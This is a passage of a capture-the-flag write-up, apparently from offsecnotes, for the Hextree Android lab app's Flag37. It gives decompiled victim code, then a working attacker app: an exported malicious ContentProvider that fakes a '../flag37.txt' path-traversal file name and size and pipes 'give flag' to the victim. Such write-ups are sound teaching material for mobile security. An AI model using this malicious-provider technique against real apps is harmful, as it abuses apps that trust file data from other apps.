+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a>                                <span class="bu">String</span> line <span class="op">=</span> bufferedReader<span class="op">.</span><span class="fu">readLine</span><span class="op">();</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a>                                <span class="cf">if</span> <span class="op">(</span>line <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a>                                    <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a>                                <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a>                                    sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>line<span class="op">);</span></span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a>                                <span class="op">}</span></span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a>                            <span class="op">}</span></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true" tabindex="-1"></a>                            inputStreamOpenInputStream<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true" tabindex="-1"></a>                            <span class="kw">this</span><span class="op">.</span><span class="fu">f</span><span class="op">.</span><span class="fu">addTag</span><span class="op">(</span>sb<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true" tabindex="-1"></a>                            <span class="cf">if</span> <span class="op">(</span><span class="st">&quot;give flag&quot;</span><span class="op">.</span><span class="fu">equals</span><span class="op">(</span>sb<span class="op">.</span><span class="fu">toString</span><span class="op">()))</span> <span class="op">{</span></span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true" tabindex="-1"></a>                                <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb19-32"><a href="#cb19-32" aria-hidden="true" tabindex="-1"></a>                            <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb19-33"><a href="#cb19-33" aria-hidden="true" tabindex="-1"></a>                                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag37&quot;</span><span class="op">,</span> <span class="st">&quot;File content &#39;&quot;</span> <span class="op">+</span> <span class="op">((</span><span class="bu">Object</span><span class="op">)</span> sb<span class="op">)</span> <span class="op">+</span> <span class="st">&quot;&#39; is not &#39;give flag&#39;&quot;</span><span class="op">);</span></span>
+<span id="cb19-34"><a href="#cb19-34" aria-hidden="true" tabindex="-1"></a>                            <span class="op">}</span></span>
+<span id="cb19-35"><a href="#cb19-35" aria-hidden="true" tabindex="-1"></a>                        <span class="op">}</span></span>
+<span id="cb19-36"><a href="#cb19-36" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb19-37"><a href="#cb19-37" aria-hidden="true" tabindex="-1"></a>                        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag37&quot;</span><span class="op">,</span> <span class="st">&quot;File name &#39;&quot;</span> <span class="op">+</span> string <span class="op">+</span> <span class="st">&quot;&#39; or size &#39;&quot;</span> <span class="op">+</span> j <span class="op">+</span> <span class="st">&quot;&#39; does not match&quot;</span><span class="op">);</span></span>
+<span id="cb19-38"><a href="#cb19-38" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb19-39"><a href="#cb19-39" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb19-40"><a href="#cb19-40" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>cursorQuery <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb19-41"><a href="#cb19-41" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb19-42"><a href="#cb19-42" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb19-43"><a href="#cb19-43" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">Exception</span> e<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb19-44"><a href="#cb19-44" aria-hidden="true" tabindex="-1"></a>            cursorQuery<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb19-45"><a href="#cb19-45" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">Throwable</span> th<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb19-46"><a href="#cb19-46" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb19-47"><a href="#cb19-47" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To get the flag, we must create a malicious app that serves a <code>ContentProvider</code> capable of satisfying both checks.</p>
+<ul>
+<li><strong>Bypassing the query check</strong>: We override the <code>query()</code> method. Instead of using a heavyweight SQLite database, we can use a <code>MatrixCursor</code> to construct a dynamic, in-memory table containing the exact columns (<code>_display_name</code>, <code>_size</code>) and values the victim expects.</li>
+<li><strong>Bypassing the content check</strong>: We override the <code>openFile()</code> method. Instead of creating a physical file on the disk, we can generate an in-memory stream using <code>ParcelFileDescriptor.createPipe()</code>. This allows us to pipe the string <code>give flag</code> directly to the victim.</li>
+</ul>
+<div class="sourceCode" id="cb20"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;utf-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">manifest</span> <span class="er">...</span>&gt;</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">application</span> <span class="er">...</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>        <span class="er">&lt;</span><span class="ot">provider</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a>            <span class="er">android:name</span><span class="ot">=</span><span class="st">&quot;.AttackProvider&quot;</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:authorities=</span><span class="st">&quot;com.example.myapplication.attack.provider&quot;</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:exported=</span><span class="st">&quot;true&quot;</span>&gt;&lt;/<span class="kw">provider</span>&gt;</span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">application</span>&gt;</span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>/manifest&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb21"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag37Activity&quot;</span><span class="op">);</span></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://com.example.myapplication.attack.provider/file.txt&quot;</span><span class="op">));</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setFlags</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">FLAG_GRANT_READ_URI_PERMISSION</span><span class="op">);</span></span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> AttackProvider <span class="kw">extends</span> ContentProvider <span class="op">{</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">AttackProvider</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> projection<span class="op">,</span> <span class="bu">String</span> selection<span class="op">,</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>                        <span class="bu">String</span><span class="op">[]</span> selectionArgs<span class="op">,</span> <span class="bu">String</span> sortOrder<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a>        MatrixCursor cursor <span class="op">=</span> <span class="kw">new</span> <span class="fu">MatrixCursor</span><span class="op">(</span><span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;_display_name&quot;</span><span class="op">,</span> <span class="st">&quot;_size&quot;</span><span class="op">});</span></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a>        cursor<span class="op">.</span><span class="fu">addRow</span><span class="op">(</span><span class="kw">new</span> <span class="bu">Object</span><span class="op">[]{</span><span class="st">&quot;../flag37.txt&quot;</span><span class="op">,</span> <span class="dv">1337</span><span class="op">});</span></span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> cursor<span class="op">;</span></span>
+<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> ParcelFileDescriptor <span class="fu">openFile</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span> mode<span class="op">)</span> <span class="kw">throws</span> <span class="bu">FileNotFoundException</span> <span class="op">{</span></span>
+<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;AttackProvider&quot;</span><span class="op">,</span> <span class="st">&quot;openFile(&quot;</span> <span class="op">+</span> uri<span class="op">.</span><span class="fu">toString</span><span class="op">()</span> <span class="op">+</span> <span class="st">&quot;)&quot;</span><span class="op">);</span></span>
+<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a>            ParcelFileDescriptor<span class="op">[]</span> pipe <span class="op">=</span> ParcelFileDescriptor<span class="op">.</span><span class="fu">createPipe</span><span class="op">();</span></span>
+<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a>            ParcelFileDescriptor<span class="op">.</span><span class="fu">AutoCloseOutputStream</span> outputStream <span class="op">=</span> <span class="kw">new</span> ParcelFileDescriptor<span class="op">.</span><span class="fu">AutoCloseOutputStream</span><span class="op">(</span>pipe<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
+<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a>            <span class="kw">new</span> <span class="bu">Thread</span><span class="op">(()</span> <span class="op">-&gt;</span> <span class="op">{</span></span>
+<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a>                <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a>                    outputStream<span class="op">.</span><span class="fu">write</span><span class="op">(</span><span class="st">&quot;give flag&quot;</span><span class="op">.</span><span class="fu">getBytes</span><span class="op">());</span></span>
+<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a>                    outputStream<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a>                    Log<span class="op">.</span><span class="fu">e</span><span class="op">(</span><span class="st">&quot;AttackProvider&quot;</span><span class="op">,</span> <span class="st">&quot;Error in pipeToParcelFileDescriptor&quot;</span><span class="op">,</span> e<span class="op">);</span></span>
+<span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a>            <span class="op">}).</span><span class="fu">start</span><span class="op">();</span></span>
+<span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> pipe<span class="op">[</span><span class="dv">0</span><span class="op">];</span></span>
+<span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">FileNotFoundException</span><span class="op">(</span><span class="st">&quot;Could not open pipe for: &quot;</span> <span class="op">+</span> uri<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
